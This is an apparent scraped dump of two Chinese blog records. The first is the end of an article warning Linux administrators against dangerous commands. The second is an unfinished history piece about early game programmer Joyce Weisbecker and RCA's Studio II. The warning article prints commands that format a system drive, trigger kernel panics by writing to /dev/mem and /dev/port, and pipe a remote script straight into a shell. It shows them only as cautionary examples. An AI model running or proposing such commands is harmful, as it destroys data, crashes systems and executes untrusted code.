!important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmkfs.ext3 /dev/hda</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2967c0919525661594-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2967c0919525661594-1\"><span class=\"crayon-v\">mkfs</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">ext3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">hda</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>……它会用 ext3 文件系统格式化主硬盘驱动器。别，请等一下！你正在格式化你的主驱动器！难道你不需要用它？</p>\n<p>当你要格式化驱动器的时候，请务必加倍确认你正在格式化的分区是真的需要格式化的那块而不是你正在使用的那块，无论它们是 SSD、闪存盘还是其他氧化铁磁盘。</p>\n<h1 id=\"toc_7\">内核崩溃</h1>\n<p>一些 Linux 命令不能让你的机器长时间停机。然而，一些命令却可以导致内核崩溃。这些错误通常是由硬件问题引起的，但你也可以自己搞崩。</p>\n<p>当你遭遇内核崩溃，重新启动系统你才可以恢复工作。在一些情况下，这只是有点小烦；在另一些情况下，这是一个大问题，比如说，高负荷运作下的生产环境。下面有一个案例：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2967c091f134079981\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndd if=/dev/random of=/dev/port\r\necho 1 &gt; /proc/sys/kernel/panic\r\ncat /dev/port\r\ncat /dev/zero &gt; /dev/mem</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2967c091f134079981-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f2967c091f134079981-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f2967c091f134079981-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f2967c091f134079981-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2967c091f134079981-1\"><span class=\"crayon-e\">dd </span><span class=\"crayon-st\">if</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">random </span><span class=\"crayon-v\">of</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">port</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f2967c091f134079981-2\"><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">proc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sys</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">kernel</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">panic</span></div><div class=\"crayon-line\" id=\"crayon-5a6f2967c091f134079981-3\"><span class=\"crayon-v\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">port</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f2967c091f134079981-4\"><span class=\"crayon-v\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">zero</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mem</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>这些都会导致内核崩溃。</p>\n<p>绝不要运行你并不了解它功能的命令，它们都在提醒我…</p>\n<h1 id=\"toc_8\">提防未知脚本</h1>\n<p>年轻或是懒惰的系统管理员喜欢复制别人的脚本。何必重新重复造轮子？所以，他们找到了一个很酷的脚本，承诺会自动检查所有备份。他们就这样运行它：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2967c0922728738463\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nwget https://ImSureThisIsASafe/GreatScript.sh -O- | sh</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2967c0922728738463-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2967c0922728738463-1\"><span class=\"crayon-e\">wget </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//ImSureThisIsASafe/GreatScript.sh -O- | sh</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这会下载该脚本，并将它送到 shell 上运行。很明确，别大惊小怪，对吧？不对。这个脚本也许已经被恶意软件感染。当然，一般来说 Linux 比大多数操作系统都要安全，但是如果你以 root 用户运行未知代码，什么都可能会发生。这种危害不仅在恶意软件上，脚本作者的愚蠢本身同样有害。你甚至可能会因为一个未调试的代码吃上一堑——由于你没有花时间去读它。</p>\n<p>你认为你不会干那样的事？告诉我，所有那些 <a href=\"https://www.oreilly.com/ideas/five-security-concerns-when-using-docker\">你在 Docker 里面运行的容器镜像在干什么</a>？你知道它们到底在运行着什么吗？我见过太多的没有验证容器里面装着什么就运行它们的系统管理员。请不要和他们一样。</p>\n<h1 id=\"toc_9\">结束</h1>\n<p>这些故事背后的道理很简单。在你的 Linux 系统里，你有巨大的控制权。你几乎可以让你的服务器做任何事。但是在你使用你的权限的同时，请务必做认真的确认。如果你没有，你毁灭的不只是你的服务器，而是你的工作甚至是你的公司。像蜘蛛侠一样，负责任的使用你的权限。</p>\n<p>我有没有遗漏什么？在 <a href=\"http://www.twitter.com/sjvn\">@sjvn</a> 或 <a href=\"http://www.twitter.com/enterprisenxt\">@enterprisenxt</a> 上告诉我哪些 Linux 命令在你的“<a href=\"https://www.youtube.com/watch?v=v79fYnuVzdI\">绝不要运行！</a>”的清单上。</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113437\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113437votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113437\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 5 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 4 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "其他", "front_image_url": ["http://wx4.sinaimg.cn/mw690/7cc829d3gy1fmz312xf4mj207r09madg.jpg"], "title": "最早做游戏设计与开发的女程序员", "fav_nums": 1, "url": "http://blog.jobbole.com/113401/", "create_date": "2017/12/30", "url_object_id": "d319eedfb1e9cbc1005652a308ca61e9", "comment_nums": 0, "front_image_path": "full/34af66ec0a5fd8bfe9417796de5cea3f5953ab7c.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/chenyahui\">精算狗</a> 翻译，<a href=\"http://www.jobbole.com/members/huanglimin\">黄利民</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://www.fastcodesign.com/90147592/rediscovering-historys-lost-first-female-video-game-designer\">BENJ EDWARDS</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>第一批电子游戏程序员之一是一位年轻女性，那时她刚从高中毕业。</p>\n<p>四十年前，消费电子产品巨头 RAC 发布了 Studio II。这是一款可编程的电子游戏控制台，与 <a href=\"https://www.fastcompany.com/3040889/the-untold-story-of-the-invention-of-the-game-cartridge\">Fairchild Channel F</a> 一起，率先使用只读存储器盒（ROM cartridge）作为可交换的游戏媒体。</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fmz312xf4mj207r09madg.jpg\" width=\"279\" height=\"346\"></p>\n<p>RCA 的控制台永远没能比得上 Atari 的 VCS，Magnavox 的 Odyssey，或者 Mattel 的 Intellivision。而且现在几乎没人记得它。但是它背后的真实故事是迷人的。它的基础技术始于 1969 年，当时一位有远见的人——Joseph Weisbecker——在家中开发出个人电脑。他的女儿 Joyce 最终成为了已知最早的女性开发者，她编写电子游戏并为此拿报酬。</p>\n<p>Joyce Weisbecker 的工作成果太不出名了，以至于在 2011 年，我宣称 <a href=\"http://www.vintagecomputing.com/index.php/archives/800/vcg-interview-carol-shaw-female-video-game-pioneer-2\">Carol Shaw</a> 为“第一位女性专业电子游戏设计师”。<a href=\"http://www.vintagecomputing.com/index.php/archives/800/vcg-interview-carol-shaw-female-video-game-pioneer-2\">Carol Shaw</a> 从 1978 年开始在 Atari 工作，并在之后设计了 Activision 的经典游戏 <i>River Raid</i>。而 Joyce Weisbecker 的成果是由一位科技历史学家提醒我的。尽管 Shaw 的工作成果依然在历史上很重要，但是实际上，Joyce Weisbecker 的成果要比她的早大约两年。</p>\n<p>而且 Joyce 是在没有成为 RCA 工作人员的情况下完成的。她现在说：“我知道当时 RCA 没有其他女性做开发工作。开发工作是由一些男性来做的，而且他们都是员工。我想我是唯一一个收钱开发电子游戏的公司外的人。所以我是第一个合同工，可能也是第一个独立的电子游戏开发者，因为我想到了这个主意又推销了它，然后他们说行。”</p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1fmz313s7zpj20g3092qaf.jpg\" width=\"579\" height=\"326\"></p>\n<h2>流在她血液里的工程学</h2>\n<p>Joyce Weisbecker 于 1958 年出生于新泽西州。她记得在童年时期，看着她的爸爸——一个固执的爱好者——利用白天不在 RCA 工作的时间，开发逻辑游戏，为当地魔术师设计舞台幻象并在地下室建造电子发明。她的妈妈 Jean Ann 是一位三年级教师。Jean 强调教育的价值，并鼓励大女儿追寻她天生的追求。</p>\n<p>无论什么时候，Joyce 一有机会就跟着去父亲在 RCA 的办公室，看看开发是什么。在那里，工程师们亲切地看着这个女孩，她似乎自然地吸收了展示给她的所有东西，包括一个由 RCA 爱玩的工程师在 20 世纪 60 年代中期开发的台球电子游戏原型。</p>\n<p>除了 Joseph 在 RCA 的工程工作外，他还被电脑的未来深深吸引着。在他读了 Edmund Berkeley 1949年的一本开创性的书——<i>Giant Brains </i>或者叫<i> Machines that Think ——</i>之后，他就迷上了这个领域。Joyce 讲述了她的父母在 1955 年秋天第一次相遇的故事，她的父亲告诉她母亲，某一天电脑会急剧微型化，并被装进几乎所有东西里——冰箱、打字机和烤箱。</p>\n<p>当 Joseph 最初迷上电脑时，电脑基本上就是真空管供电的庞然大物，需要用一个小城市的电力来操作。所以年长的 Weisbecker 用任何人能在纸上演算的计算技巧进行了大量实验。在 20 世纪 60 年代，他甚至写了一本平装书来跟你玩井字棋游戏（Tic-Tac-Toe），依据你选的哪一页书（也就是走哪一步）。</p>\n<p>随着科技的进步，Joseph 开始在家用电脑进行实验。一个叫作 Heathkit 的公司销售各种各样的电子产品和器具，任何人都可以订购未组装的产品，自己组装。Joyce 说：“他想买一个 Heathkit 的产品来建一个电脑。但是既然没有现成的，他决定把设计一个电脑的 Heathkit 作为一生的目标，这样任何人都能买来造一台电脑。”</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmz314gnjej20fz093n40.jpg\" width=\"575\" height=\"327\"></p>\n<p>那时，典型的迷你电脑的价格在 $6,000 到 $25,000 之间。（为正确看待它，1972 年的美国户均年收入为 $11,286。）Joseph 晚上在地下室工作几个小时，自己用分离的元件和电路设计了一个完整的电脑系统，包括一个定制的中央处理器。</p>\n<p>Joyce 记得 1969 年陪父亲去 Radio Shack 商店购买他电脑原型的元件。他得去四个不同的商店买足够的开关和元件来制作电脑的前面板。前面板包含八个开关，每个开关都针对一个指令位。一路上他都对他的计划闭口不谈，这样就不会引起店主的怀疑，否则这些店主必然就会用关于家庭电脑的问题耽误他的时间。家庭电脑在那时是神奇疯狂的想法。</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmz3151cq5j20ft09342a.jpg\" width=\"569\" height=\"327\"></p>\n<p>在 Joseph 快完成第一个家庭个人电脑原型时，他决定把他的电脑称为 FRED，或者灵活的娱乐教育设备（Flexible Recreational Educational Device）。他自己掏腰包做了一个笑脸标志，并在 1970年、1971 年及 1972 年持续工作。</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmz316ch12j20gl0bpgzb.jpg\" width=\"597\" height=\"421\"></p>\n<h2>从 FRED 到 STUDIO II</h2>\n<p>Joyce 家 1300 平方英尺的房子在切里希尔（Cherry Hill）。Joyce 的父亲在地下室完成 FRED 之后，把他的机器放在餐厅旁的封闭后阳台。很快 Joyce 和她的小妹妹 Jean 就在父亲的鼓励下玩起了 FRED。Joyce 甚至开始了编程。</p>\n<p>她回忆说：“这是自然而然的兴趣。爸爸向我和妹妹演示了怎么做。我妹妹更喜欢上马术课。但是我想：’这就像很酷的谜题。这就是谜题的本质——它要么抓住你的兴趣，要么不。’”它一定抓住了 Joyce 的兴趣，Joyce 是她高中为数不多学习使用学校的可编程 100 步计算器的人之一。</p>\n<p>Joseph Weisbecker 在 RCA 的经理注意到了 FRED，但是他们最初持怀疑态度。在 20 世纪 70 年代早期，RCA 有号召力的长期领导 David Sarnoff 退休，RCA 随之退出了其黄金时代。他的辞职使得公司群龙无首，尽管他的儿子带领 RCA 走向无数方向，包括收购地毯公司和养鸡场。另外，RCA 由于最近向大型电脑市场进军的尝试失败而受损，导致数百万美元的贬值。</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmz3174s1ej20g8091n52.jpg\" width=\"584\" height=\"325\"></p>\n<p>大约 1973 年，RCA 将其注意力转回电脑上，Joseph 的自制 8 位电脑体系结构成为了官方用芯片建完整电脑项目的一部分。结果有了 Cosmac 1801 系列，它是 1975 年首次商用的两芯片微处理器系统。（后来改进为单芯片，Cosmac 1802，发布于 1976 年。）RCA 管理层把项目转向工业应用的内置电脑控制方向，但是老 Weisbecker 从没放弃为大众创造教育电脑的梦想。</p>\n<p>大约在 Atari 的 <i>Pong </i>火起来的时候，Joseph 试着向 RCA 推销可编程家庭电子游戏控制台的想法，但是管理层最初对这个想法没有兴趣。大约 1975 年，FRED 技术进入了拥有可交换软件的硬币操控的街机电子游戏柜。该项目很快成为泡影。但是最终，Joseph 的努力促成了一些家庭电脑产品，包括 DIY 个人电脑 Cosmac VIP 和游戏控制台 Studio II。</p>\n<p>Joyce Weisbecker 说：“他们拖了一年来决定他们向进入家庭市场。然后他们又花了一年多一点时间才真正做出来。而且还绕过了 FCC 认证。”</p>\n<p>根据 Joyce 所说，尽管 Studio II 直到 1977 年一月才公布——那是 Fairchild Channel F 进入市场几个月后——所用的技术，包括盒里的游戏，在 1975 年就准备好了。她说：“我觉得我对这件事有点愤愤不平，他本可以成为第一个。”</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmz317saz6j20g5093tgo.jpg\" width=\"581\" height=\"327\"></p>\n<h2>工作中的 WEISBECKERS</h2>\n<p>基于 Joyce 父亲工作成果的家庭电子产品出现了。这为刚刚高中毕业的 Joyce 提供了一个机会。在 1976 年夏天，也是在瑞德大学第一个学期开始前的假期，Joseph 问她是否想为 RCA 编写电子游戏。</p>\n<p>她已经对她父亲的机器有了丰富的经验，便一头扎进了为 RCA Cosmac VIP 编写演示游戏的工作中。RCA Cosmac VIP 是廉价的商业电脑组件。它是基于 Joseph 的 FRED 来设计的，既作为原始家庭个人电脑，也作为 Cosmac 1802 CPU 应用的开发组件。</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmz318e5d8j20ev07mmz1.jpg\" width=\"535\" height=\"274\"></p>\n<p><i></i><i>Snake Race</i> 和 <i>Jackpot </i>是 Joyce 在 RCA 的编程首秀，尽管她没有为此收取报酬。她的父亲用来执行 VIP 项目的预算并不充足。RCA 把她写的软件包括在 VIP 使用手册的登记项目中，由机器所有者手动键入。</p>\n<p>但是很快 Joyce 就从 RCA 拿到了她的第一笔收入。随着  Studio II 家庭游戏控制台的工作准备好了，公司开始寻找软件。RCA 的雇员 Andy Modla 完成了 Studio II 10 盒的大部分发布，但是老 Weisbecker 把这看成她女儿获得更多编程经验的好机会。</p>\n<p>至于她女儿的控制台首秀的主角，Joseph 转向了他最喜欢的关注点：教育。把 Studio II 既看作廉价家庭电脑，又看作游戏控制台。他建议 RCA 利用它与子公司 Random House 教科书事业的联系。（该出版社是 RCA 疯狂混乱的经营多样化时期收购的不相关的公司。）</p>\n<p>八月份的某一天，Joseph 回家说：“他们在找人做关于 Studio II 的测验。你想做吗？”</p>\n<p>Joyce 回复道：“听起来挺无聊的。”</p>\n<p>他说：“写到你的简历上，你还能得到报酬呢。”</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmz3191lt5j20g80bj11q.jpg\" width=\"584\" height=\"415\"></p>\n<p>根据 Joyce 保存的发票来看，这开始于一个叫做 <i>TV Schoolhouse I </i>的项目。Joyce 于 1976 年八月初编写完 TV Schoolhouse I，于八月九号提供给 RCA 并拿到了 250 美元的收入。编写这个简单游戏花了她大约一周时间。她在父亲的 FRED 原型机上工作，用纸笔写下集合代码，用十六进制的键盘输进电脑，一次一条命令。与她早期为 RCA 做的的编程工作不同，她的早期工作为她在 Cosmac VIP 使用手册上赢得了称赞，而这次她是匿名工作的。</p>\n<p><i></i><i>TV Schoolhouse I </i>是双玩家电脑测验，依赖于打印的来自盒的问题集。每个玩家轮流读小册子里的问题，然后用 Studio II 的键盘输入一个单选答案。程序会检查正确答案并在屏幕上计分。</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fmz319r583j20gg0cf7e0.jpg\" width=\"592\" height=\"447\"></p>\n<p>1976 年十月，Joyce 编写了两个动作游戏：<i>Speedway</i> 和 <i>Tag</i>。在 <i>Speedway</i> 里，玩家驾驶一辆小车行驶在头顶上的赛道，与第二个人类玩家比赛。只有一个问题：Studio II 极低的 64 图形分辨率的 32 像素没给细节留下多大空间。</p>\n<p>Joyce 说：“和现代电脑打交道的人不能理解这样的限制。困难的部分不是把代码放进 2K 或者运行一个缓慢的处理器——你能用它做很多事情。问题是你怎么在有限的东西上展现这个游戏？你有两个等级的、黑白的、32 比 32 窗口图标，那就是你整个屏幕。”</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fmz31a7yq0j20fz0acwep.jpg\" width=\"575\" height=\"372\"></p>\n<p>这些限制解释了为什么在 <i>Speedway </i>里，Joyce 选择用两个白色方块代表赛车，其中一个中间有个黑点。她说：“人们批评说：’哦，是啊，这看起来根本不像个车。’你试试啊！你知道吗？你试试做一个能整个放进两个窗口图标里的游戏。”</p>\n<p>Joyce 的 <i>Tag </i>是一个更简装的东西。在这个双玩家游戏中，每个玩家控制屏幕上的一个简单的点。一个玩家是“it;”，他必须引导他们的点远离另一个玩家的点，这样他们就不会碰到。每次游戏都有两分钟长，得到最高分的人（每次接触得 10  分）赢得游戏。</p>\n<p><i></i><i>Tag </i>代表能用两个点在屏幕上玩的几乎最简单的电子游戏。巧合地是，一个相似的游戏是第一个 TV 基础上的电子游戏，由 Sanders Associates 的 Ralph Baer 和 Bill Harrison 在 1967 年创造（Baer 把它叫做“追逐游戏”）。</p>\n<p>RCA 在一个盒中发布了这两个游戏，这是 Weisbecker 自己做的选择。她回忆说：“在 <i>Speedway </i>上我还有多余的空间。<i>Tag </i>太简单了不能放在它自己单独的盒里。我想提高 RCA 想买我的赛车游戏的机会。”</p>\n<p>RCA 确实买了它，由一张 1976 年 11 月 28 日的发票证明。她说这两个游戏花了她 200 个小时来工作。她回忆说：“我十月份发送了代码并给他们开了账单。但显然，要么他们不喜欢它，要么我意识到我本来能让它更快。在十一月，我给他们发送了修改版本，那是他们发布的版本。”</p>\n<p>在考虑到这些游戏的历史意义时，必须记着 Studio II 的局限——以及这些早期游戏来自于一个刚刚高中毕业的人，那时只有极少美国人拥有电脑或者与电脑有交集。当然，那时她已经在世界上第一台家庭电脑上编程了好几年。世界很快会跟上步伐：1976年末，美国会卖出 40,000 台个人电脑。</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fmz31b06cwj20gf097ak1.jpg\" width=\"591\" height=\"331\"></p>\n<h2>发布失败</h2>\n<p>在市场上没能打败更有能力的 Fairchild Channel F，Studio II 在发布时就被淘汰了。Atari 后来在 1977 年发布了未来的控制台 VCS。</p>\n<p>除了低像素，Studio II 的主要缺点之一是它的内置 Touch Tone，像是键盘控制器，没有操控杆的选择。Joyce 为键盘给出了几个理由，包括降低制造价格来达到 150 美元价格点的诉求，以及 RCA （和 Joseph Weisbecker）打算在计划的替代物发布之前把 Studio II 作为权宜之计的事实。包括彩色 Studio III 游戏控制台，中间的 Studio IV 家庭个人电脑以及完全合格的 Studio V 电脑。Joyce 说：“当你有一个高分辨率的全色彩屏幕，是的，你才把操控杆放上去。那是为了后来的新版软件，与家庭电脑或者高级电子游戏系统搭配，如果你能走到那一步的话。”</p>\n<p>由于技术限制和有限的游戏库，Studio II 经营惨淡，RCA 在仅仅一年后撤下了该产品，也就是 1978 年二月。</p>\n<p>Joseph Weisbecker 发现自己受阻受挫，有着很多永不见天日的教育电脑产品计划。但是对 RCA 来说，这些消费电子产品永远是次要的考虑，Joyce 说：“RCA 管理层永远不想踏进电子游戏市场了。”他们仅仅想为他们的半导体找到市场。</p>\n<p>根据该目标判断，1802 CPU 取得了巨大的成功。虽然 RCA 在娱乐和家庭电脑产品上永远进行得不好，但是它在移动电话、心脏起搏器甚至太空探测器（比如 1989 年发射的 <i>Galileo</i>，探索木星和它的卫星）领域中找到了位置。芯片的一个版本今天仍然被制造，并为它的错误忍耐力和物理强度受到称赞。该芯片包含与 Joseph Weisbecker 在 1969 年为其家庭电脑设计相同的电脑架构。</p>\n<p>由于 Studio II 的短暂寿命，Joyce 